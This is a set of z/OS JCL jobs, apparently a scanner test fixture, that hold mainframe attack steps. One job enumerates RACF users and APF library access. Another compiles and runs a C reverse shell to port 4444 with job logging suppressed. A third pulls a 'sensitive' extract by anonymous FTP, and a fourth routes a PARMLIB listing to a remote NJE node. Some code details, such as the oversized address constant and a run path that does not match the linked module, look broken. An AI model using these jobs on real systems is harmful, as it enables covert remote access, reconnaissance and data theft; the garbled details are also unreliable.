

//*--------------------------------------------------------------------

//*--------------------------------------------------------------------
//H4CKRNJE JOB (1234567),'ABC 123',CLASS=A,USER=MYUSER,
//             MSGLEVEL=(0,0),             
//             MSGCLASS=K,NOTIFY=&SYSUID
//TSOCMD   EXEC PGM=IKJEFT01
//SYSTSPRT DD SYSOUT=*
//SYSOUT   DD SYSOUT=*
//SYSTSIN  DD *
  lu                                       /* List all users */
  listdsd dataset('SYS1.') generic auth    /* List APF lib access */
  listdsd dataset('RACF') generic auth
/*

//*--------------------------------------------------------------------

//*--------------------------------------------------------------------
//REVSHELL JOB (1234567),'REVSHELL',CLASS=A,NOTIFY=&SYSUID,
//             MSGLEVEL=(0,0),MSGCLASS=X   <== SAST: HIDDEN JES LOG
//COMPILE  EXEC PGM=CBCC,REGION=4096K,
//             PARM='SO,OPT,LANGLVL(EXTENDED)'
//SYSPRINT DD SYSOUT=*
//SYSIN    DD *
#include <sys/socket.h>
#include <unistd.h>
int main(){
  int s=socket(AF_INET,SOCK_STREAM,0);
  
  struct sockaddr_in sa;
  sa.sin_family=AF_INET;
  sa.sin_port=htons(4444);
  sa.sin_addr.s_addr=0x6300006300;
  connect(s,(struct sockaddr*)&sa,sizeof(sa));
  dup2(s,0); dup2(s,1); dup2(s,2);
  execl("/bin/sh","sh",0);
}
/*
//SYSLIN   DD DSN=&&OBJ,DISP=(NEW,PASS),SPACE=(TRK,(5,2))
//LKED     EXEC PGM=HEWL,COND=(8,LT),PARM='AMODE=31'
//SYSPRINT DD SYSOUT=*
//SYSLIN   DD DSN=&&OBJ,DISP=(OLD,DELETE)
//SYSLMOD  DD DSN=&&EXE,DISP=(NEW,PASS),SPACE=(TRK,(5,2)),
//            DCB=(RECFM=U,LRECL=0,BLKSIZE=6144)
//RUN      EXEC PGM=BPXBATCH,COND=(8,LT)   
//STDOUT   DD SYSOUT=*
//STDERR   DD SYSOUT=*
//STDPARM  DD *
SH /tmp/rsh
/*

//*--------------------------------------------------------------------

//*--------------------------------------------------------------------
//FTPBATCH JOB (FTP001),'BATCH FTP XFER',CLASS=A,NOTIFY=&SYSUID
//STEP010  EXEC PGM=FTP,PARM='PRODHOST.COMPANY.COM'  
//SYSPRINT DD SYSOUT=*
//INPUT    DD *
anonymous                               
anonymous@company.com                   
binary
get /pub/data/sensitive_extract.dat
quit
/*

//*--------------------------------------------------------------------

//*--------------------------------------------------------------------
//NJEXMIT  JOB (1234567),'NJE XMIT JOB',CLASS=A,
//             MSGLEVEL=(0,0),NOTIFY=&SYSUID
/*XEQ REMNODE                          
//TSOCMD   EXEC PGM=IKJEFT01
//SYSTSPRT DD SYSOUT=*
//SYSOUT   DD SYSOUT=*
//SYSTSIN  DD *
  TIME
  LISTDS 'SYS1.PARMLIB'
/*


